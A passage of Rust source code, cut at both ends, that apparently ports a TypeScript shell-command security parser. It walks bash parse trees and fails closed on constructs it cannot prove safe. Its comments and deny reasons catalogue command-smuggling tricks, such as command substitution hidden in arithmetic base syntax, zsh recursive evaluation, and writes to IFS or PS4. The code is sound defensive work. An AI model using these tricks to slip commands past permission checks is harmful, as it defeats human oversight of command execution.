            e3i(var_scope, node, src);
            Some(snap)
        } else {
            None
        };
        let mut seen_then = false;
        for child in children(node) {
            match child.kind() {
                "if" | "fi" | "else" | "elif" | "while" | "until" | ";" => continue,
                "then" => {
                    seen_then = true;
                    continue;
                }
                "do_group" => {
                    let mut d = var_scope.clone();
                    e3i(&mut d, child, src);
                    for c in children(child) {
                        if matches!(c.kind(), "do" | "done" | ";") {
                            continue;
                        }
                        if let Some(err) = collect_commands(c, commands, &mut d, src) {
                            return Some(err);
                        }
                    }
                    dur(var_scope, &d);
                    continue;
                }
                "elif_clause" | "else_clause" => {
                    let mut d = var_scope.clone();
                    for c in children(child) {
                        if matches!(c.kind(), "elif" | "else" | "then" | ";") {
                            continue;
                        }
                        if let Some(err) = collect_commands(c, commands, &mut d, src) {
                            return Some(err);
                        }
                    }
                    dur(var_scope, &d);
                    continue;
                }
                _ => {}
            }
            // A condition (seen_then=false) or then-body child. Walk on a COPY.
            let mut l = var_scope.clone();
            let c_start = commands.len();
            if let Some(err) = collect_commands(child, commands, &mut l, src) {
                return Some(err);
            }
            if !seen_then {
                // Condition: reconcile the copy `l` back into the REAL scope, but
                // FAIL CLOSED whenever a tracked literal may have changed or been
                // unset (the condition may short-circuit / pipeline / subshell).
                // `ref_map` holds the ORIGINAL literals (while: pre-scan snapshot;
                // if: the scope as it stood before this child).
                let ref_map: HashMap<String, String> =
                    snapshot.clone().unwrap_or_else(|| var_scope.clone());
                for (d, p) in &l {
                    if let Some(f) = ref_map.get(d) {
                        if !contains_any_placeholder(f) && p != f {
                            return Some(ParseForSecurityResult::TooComplex {
                                reason: format!(
                                    "'{d}' was tracked as literal '{f}' but condition may modify it (||/pipeline/unset/&&-short-circuit) — cannot prove downstream value"
                                ),
                            });
                        }
                    }
                    var_scope.insert(d.clone(), p.clone());
                }
                let cur_keys: Vec<String> = var_scope.keys().cloned().collect();
                for d in cur_keys {
                    if l.contains_key(&d) {
                        continue;
                    }
                    if let Some(p) = ref_map.get(&d) {
                        if !contains_any_placeholder(p) {
                            return Some(ParseForSecurityResult::TooComplex {
                                reason: format!(
                                    "'{d}' was tracked as literal '{p}' but condition may unset it (&&-short-circuit) — cannot prove downstream value"
                                ),
                            });
                        }
                    }
                    var_scope.insert(d, VAR_PLACEHOLDER.to_string());
                }
                // `read` in the condition writes its operands (and REPLY) with a
                // runtime value; deny if it would clobber a tracked literal.
                for i in c_start..commands.len() {
                    if commands[i].argv.first().map(String::as_str) != Some("read") {
                        continue;
                    }
                    let names: Vec<String> = commands[i].argv[1..]
                        .iter()
                        .filter(|m| !m.starts_with('-') && valid_var_name_re().is_match(m))
                        .cloned()
                        .collect();
                    for m in names {
                        if let Some(g) = var_scope.get(&m) {
                            if !contains_any_placeholder(g) {
                                return Some(ParseForSecurityResult::TooComplex {
                                    reason: format!(
                                        "'read {m}' in condition may not execute (||/pipeline/subshell); cannot prove it overwrites tracked literal '{g}'"
                                    ),
                                });
                            }
                        }
                        var_scope.insert(m, VAR_PLACEHOLDER.to_string());
                    }
                    if let Some(f) = var_scope.get("REPLY") {
                        if !contains_any_placeholder(f) {
                            let f = f.clone();
                            return Some(ParseForSecurityResult::TooComplex {
                                reason: format!(
                                    "'read' in condition may write stdin to REPLY; cannot prove it overwrites tracked literal '{f}'"
                                ),
                            });
                        }
                    }
                    var_scope.insert("REPLY".to_string(), VAR_PLACEHOLDER.to_string());
                }
            } else {
                dur(var_scope, &l);
            }
        }
        // A `while` loop may run ZERO times: any var introduced solely inside it
        // is not guaranteed to exist afterward — drop keys not present pre-loop.
        if let Some(o) = orig_keys {
            let cur: Vec<String> = var_scope.keys().cloned().collect();
            for k in cur {
                if !o.contains(&k) {
                    var_scope.remove(&k);
                }
            }
        }
        return None;
    }

    if kind == "subshell" {
        // `(cmd1; cmd2)` — isolated scope. Use a COPY of varScope.
        let mut inner_scope = var_scope.clone();
        for child in children(node) {
            if matches!(child.kind(), "(" | ")") {
                continue;
            }
            if let Some(err) = collect_commands(child, commands, &mut inner_scope, src) {
                return Some(err);
            }
        }
        return None;
    }

    if kind == "test_command" {
        // `[[ EXPR ]]` / `[ EXPR ]` — push synthetic command with argv[0]='[['.
        let mut argv: Vec<String> = vec!["[[".to_string()];
        for child in children(node) {
            if matches!(child.kind(), "[[" | "]]" | "[" | "]") {
                continue;
            }
            if let Some(err) = walk_test_expr(child, src, &mut argv, commands, var_scope) {
                return Some(err);
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
        });
        return None;
    }

    if kind == "unset_command" {
        // `unset FOO BAR`, `unset -f func`. Only -f/-v flags are allowed; an
        // operand must be a bare identifier, and `unset` of an exec-influencing
        // variable ([`itt`]) defeats static analysis → deny (byte-exact reason).
        let mut argv: Vec<String> = Vec::new();
        let mut is_func = false; // `-f` seen (function unset — no var tracking)
        let mut seen_name = false; // a NAME operand has been consumed
        for child in children(node) {
            match child.kind() {
                "unset" => argv.push(node_text(child, src).to_string()),
                "variable_name" => {
                    let name = node_text(child, src).to_string();
                    if !valid_var_name_re().is_match(&name) {
                        return Some(too_complex(child));
                    }
                    argv.push(name.clone());
                    seen_name = true;
                    if is_func {
                        continue;
                    }
                    if itt(&name) {
                        return Some(ParseForSecurityResult::TooComplex {
                            reason: format!(
                                "'unset' targets shell variable {name} (exec-influencing / integer-attr / IFS / PS4)"
                            ),
                        });
                    }
                    // SECURITY: set empty so a later bare `$VAR` rejects.
                    var_scope.insert(name, String::new());
                }
                "word" => {
                    let arg = match walk_argument(Some(child), src, commands, var_scope) {
                        Ok(s) => s,
                        Err(e) => return Some(e),
                    };
                    if arg.starts_with('-') {
                        // A flag after a name, or a flag other than -f/-v, cannot
                        // be statically modelled.
                        if seen_name || (arg != "-f" && arg != "-v") {
                            return Some(too_complex(child));
                        }
                        if arg == "-f" {
                            is_func = true;
                        }
                        argv.push(arg);
                        continue;
                    }
                    if !valid_var_name_re().is_match(&arg) {
                        return Some(too_complex(child));
                    }
                    argv.push(arg.clone());
                    seen_name = true;
                    if is_func {
                        continue;
                    }
                    if itt(&arg) {
                        return Some(ParseForSecurityResult::TooComplex {
                            reason: format!(
                                "'unset' targets shell variable {arg} (exec-influencing / integer-attr / IFS / PS4)"
                            ),
                        });
                    }
                    var_scope.insert(arg, String::new());
                }
                _ => return Some(too_complex(child)),
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
        });
        return None;
    }

    Some(too_complex(node))
}

/// TS `walkRedirectedStatement` (ast.ts:1017). A `redirected_statement` wraps a
/// command (or pipeline) plus `file_redirect`/`heredoc_redirect` children.
/// Extract redirects, walk the inner command, attach redirects to the LAST
/// command. `None` = ok; `Some(err)` = fail-closed.
#[allow(dead_code)]
pub(crate) fn walk_redirected_statement(
    node: Node,
    commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let mut redirects: Vec<Redirect> = Vec::new();
    let mut inner_command: Option<Node> = None;

    for child in children(node) {
        match child.kind() {
            "file_redirect" => match walk_file_redirect(child, src, commands, var_scope) {
                Ok(r) => redirects.push(r),
                Err(e) => return Some(e),
            },
            "heredoc_redirect" => {
                if let Some(r) = walk_heredoc_redirect(child, src) {
                    return Some(r);
                }
            }
            "command"
            | "pipeline"
            | "list"
            | "negated_command"
            | "declaration_command"
            | "unset_command" => {
                inner_command = Some(child);
            }
            _ => return Some(too_complex(child)),
        }
    }

    let inner_command = match inner_command {
        Some(c) => c,
        None => {
            // `> file` alone — represent as a command with empty argv.
            commands.push(SimpleCommand {
                argv: Vec::new(),
                env_vars: Vec::new(),
                redirects,
                text: node_text(node, src).to_string(),
            });
            return None;
        }
    };

    let before = commands.len();
    if let Some(err) = collect_commands(inner_command, commands, var_scope, src) {
        return Some(err);
    }
    if commands.len() > before && !redirects.is_empty() {
        if let Some(last) = commands.last_mut() {
            last.redirects.extend(redirects);
        }
    }
    None
}

/// TS `walkFileRedirect` (ast.ts:1071). Extract operator + target from a
/// `file_redirect` node. The target must be a static word/string. `Ok(Redirect)`
/// on success; `Err(TooComplex)` fail-closed.
#[allow(dead_code)]
pub(crate) fn walk_file_redirect(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<Redirect, ParseForSecurityResult> {
    let mut op: Option<String> = None;
    let mut target: Option<String> = None;
    let mut fd: Option<i64> = None;

    for child in children(node) {
        let ck = child.kind();
        if ck == "file_descriptor" {
            fd = node_text(child, src).parse::<i64>().ok();
        } else if REDIRECT_OPS.contains(&ck) {
            op = Some(ck.to_string());
        } else if ck == "word" || ck == "number" {
            // SECURITY: `number` nodes can carry expansion children via the
            // `NN#<expansion>` quirk. Plain word/number have zero children.
            if !children(child).is_empty() {
                return Err(too_complex(child));
            }
            if brace_expansion_re().is_match(node_text(child, src)) {
                return Err(too_complex(child));
            }
            // Bash quote removal: `\X` → `X` (JS `/\\(.)/g`, `.` excludes \n).
            target = Some(unescape_word(node_text(child, src)));
        } else if ck == "raw_string" {
            target = Some(strip_raw_string(node_text(child, src)));
        } else if ck == "string" {
            match walk_string(child, src, inner_commands, var_scope) {
                Ok(s) => target = Some(s),
                Err(e) => return Err(e),
            }
        } else if ck == "concatenation" {
            match walk_argument(Some(child), src, inner_commands, var_scope) {
                Ok(s) => target = Some(s),
                Err(e) => return Err(e),
            }
        } else {
            return Err(too_complex(child));
        }
    }

    match (op, target) {
        (Some(op), Some(target)) => Ok(Redirect { op, target, fd }),
        _ => Err(ParseForSecurityResult::TooComplex {
            reason: "Unrecognized redirect shape".to_string(),
        }),
    }
}

/// TS `walkCommand` (ast.ts:1237). Walk a `command` node and extract argv /
/// env_vars / redirects via the L2 walkers. Any child type not explicitly
/// handled → `too_complex` (over-ask). Rebuilds `.text` from argv when a `$VAR`
/// was resolved or a newline is present (rule-matching fidelity).
#[allow(dead_code)]
/// TS `/^[A-Za-z_][A-Za-z0-9_]*/` leading-identifier match (`.match()[0]`), used
/// by [`xeg`] to reduce an operand like `arr[0]` to the bare NAME `arr`.
fn leading_ident(u: &str) -> Option<&str> {
    let b = u.as_bytes();
    let first = *b.first()?;
    if !(first == b'_' || first.is_ascii_alphabetic()) {
        return None;
    }
    let mut i = 1;
    while i < b.len() && (b[i] == b'_' || b[i].is_ascii_alphanumeric()) {
        i += 1;
    }
    Some(&u[..i])
}

/// TS `Xeg` (checkSemantics var-write pre-scan, `ast.ts`). Tracks which shell
/// variables a single simple command WRITES (`read`/`mapfile`/`getopts`/`printf
/// -v`/`declare`-family/`cd`/`pushd`/`popd`/…) and denies when it writes an
/// exec-influencing name ([`itt`]) whose runtime value cannot be statically
/// verified. On success (`None`) `var_scope` is updated with [`VAR_PLACEHOLDER`]
/// for the written names so a later `$VAR` correctly rejects as a bare arg.
fn xeg(
    argv: &[String],
    env_vars: &[(String, String)],
    var_scope: &mut HashMap<String, String>,
) -> Option<ParseForSecurityResult> {
    // Names this command writes (checked against `itt` at the end).
    let mut written: Vec<String> = Vec::new();
    macro_rules! push_name {
        ($u:expr) => {
            if let Some(id) = leading_ident($u) {
                written.push(id.to_string());
            }
        };
    }
    macro_rules! deny {
        ($reason:expr) => {
            return Some(ParseForSecurityResult::TooComplex { reason: $reason })
        };
    }

    // ── wrapper-strip prefix loop (H3i wrappers, `!`, leading assignments) ──
    let mut a: &[String] = argv;
    let mut saw_v = false; // `command -v/-V` — suppresses cd/pushd/popd PWD tracking
    loop {
        let u = match a.first() {
            Some(x) => x.as_str(),
            None => break,
        };
        if XEG_WRAPPERS.contains(&u) {
            let mut d = 1;
            while d < a.len() && xeg_wrapper_flag_re().is_match(&a[d]) {
                if a[d].contains('v') || a[d].contains('V') {
                    saw_v = true;
                }
                d += 1;
            }
            a = &a[d..];
        } else if u == "!" {
            a = &a[1..];
        } else if xeg_assign_word_re().is_match(u) {
            push_name!(u);
            a = &a[1..];
        } else {
            break;
        }
    }

    let c: Option<&str> = a.first().map(String::as_str);
    match c {
        None => {
            for e in env_vars {
                push_name!(&e.0);
            }
        }
        Some(c) if XEG_ASSIGN_BUILTINS.contains(&c) => {
            let mut seen_dd = false;
            for p in a.iter().skip(1) {
                if !seen_dd && p == "--" {
                    seen_dd = true;
                    continue;
                }
                if !seen_dd && declare_m_re().is_match(p) {
                    deny!(format!(
                        "'{c} {p}' (wrapped form) — zsh -m/+m pattern-assigns every matching variable; cannot statically model target set"
                    ));
                }
                if !seen_dd && p.starts_with('-') {
                    continue;
                }
                if p.contains('=') {
                    push_name!(p);
                }
            }
        }
        Some("read") => {
            let mut u = 1;
            let mut dd = false;
            let mut wrote = false;
            while u < a.len() {
                let f = &a[u];
                if !dd && f == "--" {
                    dd = true;
                    u += 1;
                    continue;
                }
                if !dd && f.starts_with('-') {
                    if READ_DATA_FLAGS.contains(&f.as_str()) {
                        u += 2;
                        continue;
                    }
                    let fb = f.as_bytes();
                    let mut m = false;
                    let mut g = 1;
                    while g < f.len() {
                        let y = fb[g];
                        if y == b'a' || y == b'A' {
                            let val = if g < f.len() - 1 {
                                f[g + 1..].to_string()
                            } else {
                                a.get(u + 1).cloned().unwrap_or_default()
                            };
                            if !val.is_empty() {
                                push_name!(&val);
                                wrote = true;
                            }
                            m = g == f.len() - 1;
                            break;
                        }
                        let flag = format!("-{}", y as char);
                        if READ_DATA_FLAGS.contains(&flag.as_str()) {
                            m = g == f.len() - 1;
                            break;
                        }
                        g += 1;
                    }
                    u += if m { 2 } else { 1 };
                    continue;
                }
                push_name!(f);
                wrote = true;
                u += 1;
            }
            if !wrote {
                written.push("REPLY".to_string());
            }
        }
        Some("printf") => {
            let mut u = 1;
            while u < a.len() {
                let d = &a[u];
                if d == "--" || !d.starts_with('-') {
                    break;
                }
                if d == "-v" {
                    if let Some(n) = a.get(u + 1) {
                        push_name!(n);
                    }
                    u += 2;
                    continue;
                }
                if d.starts_with("-v") {
                    push_name!(&d[2..]);
                }
                u += 1;
            }
        }
        Some("getopts") => {
            let off = usize::from(a.get(1).map(String::as_str) == Some("--"));
            if let Some(n) = a.get(2 + off) {
                push_name!(n);
            }
            written.push("OPTARG".to_string());
            var_scope.insert("OPTIND".to_string(), VAR_PLACEHOLDER.to_string());
        }
        Some("wait") => {
            let mut u = 1;
            while u < a.len() {
                let d = &a[u];
                if d == "--" || !d.starts_with('-') {
                    break;
                }
                let db = d.as_bytes();
                let mut p = 1;
                while p < d.len() {
                    if db[p] == b'p' {
                        if p < d.len() - 1 {
                            push_name!(&d[p + 1..]);
                        } else if let Some(n) = a.get(u + 1) {
                            push_name!(n);
                            u += 1;
                        }
                        break;
                    }
                    p += 1;
                }
                u += 1;
            }
        }
        Some(c) if c == "unset" || c == "unsetenv" => {
            let mut is_func = false;
            let mut seen_name = false;
            for f in a.iter().skip(1) {
                if f.starts_with('-') {
                    if seen_name {
                        deny!(format!(
                            "'unset … {f}' (wrapped form) — flag after name; getopt stops at first non-option"
                        ));
                    }
                    if f != "-f" && f != "-v" {
                        deny!(format!(
                            "'unset {f}' (wrapped form) — flag other than -f/-v (zsh -m pattern-unset, bash -n nameref) cannot be statically modelled"
                        ));
                    }
                    if f == "-f" {
                        is_func = true;
                    }
                    continue;
                }
                seen_name = true;
                if !valid_var_name_re().is_match(f) {
                    deny!(format!(
                        "'unset {f}' (wrapped form) — non-identifier operand may pathname-expand; cannot statically know which var is unset"
                    ));
                }
                if is_func {
                    continue;
                }
                if itt(f) {
                    deny!(format!(
                        "'unset' targets shell variable {f} (exec-influencing / integer-attr / IFS / PS4)"
                    ));
                }
                var_scope.insert(f.clone(), String::new());
            }
        }
        Some("print") => {
            let mut u = 1;
            while u < a.len() {
                let d = &a[u];
                if d == "--" || d == "-" || !d.starts_with('-') {
                    break;
                }
                let db = d.as_bytes();
                let mut p = false;
                let mut f = 1;
                while f < d.len() {
                    let m = db[f];
                    if m == b'v' {
                        let val = if f < d.len() - 1 {
                            d[f + 1..].to_string()
                        } else {
                            a.get(u + 1).cloned().unwrap_or_default()
                        };
                        if !val.is_empty() {
                            push_name!(&val);
                        }
                        p = f == d.len() - 1;
                        break;
                    }
                    let flag = format!("-{}", m as char);
                    if XEG_PRINT_VALUE_FLAGS.contains(&flag.as_str()) {
                        p = f == d.len() - 1;
                        break;
                    }
                    f += 1;
                }
                if p {
                    u += 1;
                }
                u += 1;
            }
        }
        Some("set") => {
            let mut u = 1;
            while u < a.len() {
                let d = &a[u];
                if d == "--" || !set_flag_re().is_match(d) {
                    break;
                }
                let p = d.get(1..).and_then(|s| s.find('A')).map(|i| i + 1);
                match p {
                    None => {
                        if d.ends_with('o') {
                            u += 1;
                        }
                        u += 1;
                        continue;
                    }
                    Some(p) => {
                        if p < d.len() - 1 {
                            push_name!(&d[p + 1..]);
                        } else if let Some(n) = a.get(u + 1) {
                            push_name!(n);
                        }
                        break;
                    }
                }
            }
        }
        Some(c) if c == "mapfile" || c == "readarray" => {
            let mut wrote = false;
            let mut d = 1;
            while d < a.len() {
                let p = &a[d];
                if p.starts_with('-') {
                    if xeg_mapfile_flag_re().is_match(p) {
                        d += 1;
                    }
                    d += 1;
                    continue;
                }
                push_name!(p);
                wrote = true;
                d += 1;
            }
            if !wrote {
                written.push("MAPFILE".to_string());
            }
        }
        Some(c) if !saw_v && (c == "cd" || c == "chdir" || c == "pushd" || c == "popd") => {
            let mut suppress = false;
            if c == "pushd" || c == "popd" {
                for p in a.iter().skip(1) {
                    if p == "--" {
                        break;
                    }
                    if xeg_pushd_n_re().is_match(p) {
                        suppress = true;
                        break;
                    }
                    if c == "popd"
                        && (xeg_popd_plus_re().is_match(p) || xeg_popd_minus_re().is_match(p))
                    {
                        suppress = true;
                        break;
                    }
                }
            }
            if !suppress {
                var_scope.insert("PWD".to_string(), VAR_PLACEHOLDER.to_string());
                var_scope.insert("OLDPWD".to_string(), VAR_PLACEHOLDER.to_string());
            }
            if c == "pushd" || c == "popd" {
                var_scope.insert("DIRSTACK".to_string(), VAR_PLACEHOLDER.to_string());
                var_scope.insert("dirstack".to_string(), VAR_PLACEHOLDER.to_string());
            }
        }
        Some(_) => {}
    }

    // jVc special builtins: PRECEDING `VAR=value` env assignments persist.
    if let Some(c) = c {
        if !env_vars.is_empty() && XEG_SPECIAL_BUILTINS.contains(&c) {
            for e in env_vars {
                push_name!(&e.0);
            }
        }
    }

    // Itt battery on every written name; track survivors as placeholders.
    let label = c.unwrap_or_else(|| {
        env_vars
            .first()
            .map(|e| e.0.as_str())
            .unwrap_or("undefined")
    });
    for u in &written {
        if itt(u) {
            deny!(format!(
                "'{label}' writes shell variable {u} (exec-influencing / integer-attr / IFS) — value cannot be statically verified"
            ));
        }
        var_scope.insert(u.clone(), VAR_PLACEHOLDER.to_string());
    }
    None
}

pub(crate) fn walk_command(
    node: Node,
    extra_redirects: &[Redirect],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> ParseForSecurityResult {
    let mut argv: Vec<String> = Vec::new();
    let mut env_vars: Vec<(String, String)> = Vec::new();
    let mut redirects: Vec<Redirect> = extra_redirects.to_vec();

    for child in children(node) {
        match child.kind() {
            "variable_assignment" => {
                // SECURITY: env-prefix assignments (`VAR=x cmd`) are command-local
                // in bash — do NOT add to the global varScope.
                match walk_variable_assignment(child, inner_commands, var_scope, src) {
                    Ok(ev) => {
                        // An env-prefix assignment to an integer-attributed
                        // variable arithmetically evaluates its value too.
                        if let Some(err) =
                            integer_attribute_assignment_error(&ev.name, &ev.value, true)
                        {
                            return err;
                        }
                        env_vars.push((ev.name, ev.value));
                    }
                    Err(e) => return e,
                }
            }
            "command_name" => {
                let first = children(child).into_iter().next().unwrap_or(child);
                match walk_argument(Some(first), src, inner_commands, var_scope) {
                    Ok(s) => argv.push(s),
                    Err(e) => return e,
                }
            }
            "word"
            | "number"
            | "raw_string"
            | "string"
            | "concatenation"
            | "arithmetic_expansion" => {
                match walk_argument(Some(child), src, inner_commands, var_scope) {
                    Ok(s) => argv.push(s),
                    Err(e) => return e,
                }
            }
            // NOTE: bare command_substitution at arg position is INTENTIONALLY
            // unhandled → default → too_complex (the $() output IS the argument).
            "simple_expansion" => match resolve_simple_expansion(child, src, var_scope, false) {
                Ok(s) => argv.push(s),
                Err(e) => return e,
            },
            "file_redirect" => match walk_file_redirect(child, src, inner_commands, var_scope) {
                Ok(r) => redirects.push(r),
                Err(e) => return e,
            },
            "herestring_redirect" => {
                if let Some(e) = walk_herestring_redirect(child, src, inner_commands, var_scope) {
                    return e;
                }
            }
            _ => return too_complex(child),
        }
    }

    // SECURITY (TS `Xeg`): scan the resolved argv for builtin var-writes; deny
    // when an exec-influencing name is written, else record placeholders so a
    // later `$VAR` reference correctly rejects.
    if let Some(err) = xeg(&argv, &env_vars, var_scope) {
        return err;
    }

    // SECURITY: rebuild .text from argv when node.text contains `$<ident>` (a
    // resolved simple_expansion) or a newline (line continuations). Shell-escape
    // each arg. See ast.ts:1316-1358 for the deny-rule-matching rationale.
    let raw = node_text(node, src);
    let text = if dollar_ident_re().is_match(raw) || raw.contains('\n') {
        argv.iter()
            .map(|a| {
                if a.is_empty() || shell_escape_re().is_match(a) {
                    format!("'{}'", a.replace('\'', "'\\''"))
                } else {
                    a.clone()
                }
            })
            .collect::<Vec<_>>()
            .join(" ")
    } else {
        raw.to_string()
    };

    ParseForSecurityResult::Simple {
        commands: vec![SimpleCommand {
            argv,
            env_vars,
            redirects,
            text,
        }],
    }
}

/// TS `collectCommandSubstitution` (ast.ts:1374). Recurse a `$()` node's inner
/// command(s) into `inner_commands`. Outer vars are visible inside (subshell
/// semantics) but inner assignments must NOT leak — so the outer scope is CLONED
/// and the clone threaded; the caller's `var_scope` is never mutated.
#[allow(dead_code)]
pub(crate) fn collect_command_substitution(
    cs_node: Node,
    inner_commands: &mut Vec<SimpleCommand>,
    outer_scope: &HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let mut inner_scope = outer_scope.clone();
    for child in children(cs_node) {
        if matches!(child.kind(), "$(" | "`" | ")") {
            continue;
        }
        if let Some(err) = collect_commands(child, inner_commands, &mut inner_scope, src) {
            return Some(err);
        }
    }
    None
}

/// TS `walkArgument` (ast.ts:1399). Convert an argument node to its resolved
/// literal string (the argument-position allowlist). `Ok(s)` = resolved value;
/// `Err(TooComplex)` = fail-closed. A bare `command_substitution` falls to the
/// default arm → too-complex INTENTIONALLY (the `$()` output IS the argument).
#[allow(dead_code)]
pub(crate) fn walk_argument(
    node: Option<Node>,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<String, ParseForSecurityResult> {
    let node = match node {
        Some(n) => n,
        None => {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "Null argument node".to_string(),
            })
        }
    };
    match node.kind() {
        "word" => {
            // bash quote removal: `\X` → `X` for any char X — EXCEPT JS `/\\(.)/g`
            // where `.` does not match a newline, so `\<NL>` is NOT collapsed.
            if brace_expansion_re().is_match(node_text(node, src)) {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Word contains brace expansion syntax".to_string(),
                });
            }
            Ok(unescape_word(node_text(node, src)))
        }
        "number" => {
            // SECURITY: `10#$(cmd)` parses as a `number` node WITH a child
            // (command_substitution). Plain numbers (`10`, `16#ff`) have zero
            // children.
            if !children(node).is_empty() {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Number node contains expansion (NN# arithmetic base syntax)"
                        .to_string(),
                });
            }
            Ok(node_text(node, src).to_string())
        }
        "raw_string" => Ok(strip_raw_string(node_text(node, src))),
        "string" => walk_string(node, src, inner_commands, var_scope),
        "concatenation" => {
            if brace_expansion_re().is_match(node_text(node, src)) {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Brace expansion".to_string(),
                });
            }
            let mut result = String::new();
            for child in children(node) {
                let part = walk_argument(Some(child), src, inner_commands, var_scope)?;
                result.push_str(&part);
            }
            Ok(result)
        }
        "arithmetic_expansion" => {
            if let Some(err) = walk_arithmetic(node, src) {
                return Err(err);
            }
            Ok(node_text(node, src).to_string())
        }
        // `$VAR` in a concatenation / bare counts as a bare arg (inside_string=false).
        "simple_expansion" => resolve_simple_expansion(node, src, var_scope, false),
        // command_substitution at arg position is INTENTIONALLY unhandled → reject.
        _ => Err(too_complex(node)),
    }
}

/// Unquoted-word backslash removal (TS `/\\(.)/g` in walkArgument, ast.ts:1425).
/// Drop a backslash and keep the following char — EXCEPT when that char is a
/// newline (JS `.` excludes `\n`): there the backslash stays literal. A trailing
/// lone backslash also stays.
fn unescape_word(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() && chars[i + 1] != '\n' {
            out.push(chars[i + 1]);
            i += 2;
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// Double-quoted `string_content` backslash removal (TS `/\\([$`"\\])/g`,
/// ast.ts:1552). A backslash is dropped ONLY before `$ ` " \`; every other
/// sequence (e.g. `\n`) stays literal. Distinct from [`unescape_word`].
fn unescape_string_content(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() && matches!(chars[i + 1], '$' | '`' | '"' | '\\')
        {
            out.push(chars[i + 1]);
            i += 2;
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// TS `walkString` (ast.ts:1508). Extract literal content from a double-quoted
/// `string` node, gap-filling dropped literal newlines (tree-sitter drops literal
/// `\n` inside `"…"`) and tracking literal-vs-dynamic content for the two
/// post-loop solo-placeholder / whitespace-only guards.
#[allow(dead_code)]
pub(crate) fn walk_string(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<String, ParseForSecurityResult> {
    let mut result = String::new();
    let mut cursor: i64 = -1;
    let mut saw_dynamic = false; // TS `s`: a placeholder part is present
    let mut saw_literal = false; // TS `a`: a non-empty literal part is present
    let mut saw_empty = false; // TS `l`: a part resolved to the empty string
    let kids = children(node);
    for (idx, child) in kids.iter().enumerate() {
        let child = *child;
        // Index gap = dropped literal newline(s). Skipped before the first child
        // (cursor == -1) and before a `"` delimiter (whitespace-only quirk).
        if cursor != -1 && (child.start_byte() as i64) > cursor && child.kind() != "\"" {
            let gap = (child.start_byte() as i64 - cursor) as usize;
            result.push_str(&"\n".repeat(gap));
            saw_literal = true;
        }
        cursor = child.end_byte() as i64;
        match child.kind() {
            "\"" => {
                cursor = child.end_byte() as i64;
            }
            "string_content" => {
                result.push_str(&unescape_string_content(node_text(child, src)));
                saw_literal = true;
            }
            // DOLLAR: a bare literal `$` (node kind "$") before a non-name char.
            "$" => {
                result.push('$');
                saw_literal = true;
            }
            "command_substitution" => match extract_safe_cat_heredoc(child, src) {
                CatHeredoc::Dangerous => return Err(too_complex(child)),
                CatHeredoc::Body(body) => {
                    // bash $() strips ALL trailing newlines.
                    let trimmed = body.trim_end_matches('\n');
                    if trimmed.contains('\n') {
                        // Multi-line body: drop (avoid NEWLINE_HASH FP) but it IS
                        // literal content.
                        saw_literal = true;
                    } else {
                        result.push_str(trimmed);
                        saw_literal = true;
                    }
                }
                CatHeredoc::None => {
                    if let Some(err) =
                        collect_command_substitution(child, inner_commands, var_scope, src)
                    {
                        return Err(err);
                    }
                    result.push_str(CMDSUB_PLACEHOLDER);
                    saw_dynamic = true;
                }
            },
            "simple_expansion" => {
                let v = resolve_simple_expansion(child, src, var_scope, true)?;
                // SECURITY (zsh differential): `"$name[expr]"` / `"$name:mod"` —
                // when the next sibling is a string_content that begins a subscript
                // or a `:modifier`, zsh recursively evaluates it.
                if let Some(d) = kids.get(idx + 1) {
                    if d.kind() == "string_content" {
                        let dt = node_text(*d, src);
                        let is_special = children(child)
                            .iter()
                            .any(|f| f.kind() == "special_variable_name");
                        if dt.starts_with('[')
                            || zsh_colon_mod_re().is_match(dt)
                            || (is_special && zsh_name_subscript_re().is_match(dt))
                        {
                            return Err(ParseForSecurityResult::TooComplex {
                                reason:
                                    "zsh \"$name[expr]\" / \"$name:mod\" inside double-quotes — recursive eval"
                                        .to_string(),
                            });
                        }
                    }
                }
                if contains_any_placeholder(&v) {
                    saw_dynamic = true;
                } else if !v.is_empty() {
                    saw_literal = true;
                } else {
                    saw_empty = true;
                }
                result.push_str(&v);
            }
            "arithmetic_expansion" => {
                if let Some(err) = walk_arithmetic(child, src) {
                    return Err(err);
                }
                result.push_str(node_text(child, src));
                saw_literal = true;
            }
            // expansion (${…}) inside "…" and anything else → reject.
            _ => return Err(too_complex(child)),
        }
    }
    // Guard A: a string mixing a dynamic part with ≤1 char of literal residue
    // (`"x$(cmd)"`) cannot be safely path/rule-matched → reject.
    if saw_dynamic {
        let residue = result
            .replace(CMDSUB_PLACEHOLDER, "")
            .replace(VAR_PLACEHOLDER, "");
        if residue.chars().count() <= 1 {
            return Err(too_complex(node));
        }
    }
    // Guard B: a delimiters-only string node (hidden text, no parsed parts). Return
    // the inner slice UNLESS it hides an unparsed command substitution.
    if !saw_literal && !saw_dynamic && !saw_empty {
        let text = node_text(node, src);
        if text.chars().count() > 2 {
            let mut ch = text.chars();
            ch.next();
            ch.next_back();
            let inner = ch.as_str().to_string();
            if inner.contains('`') || inner.contains("$(") {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Delimiters-only string node contains unparsed command substitution"
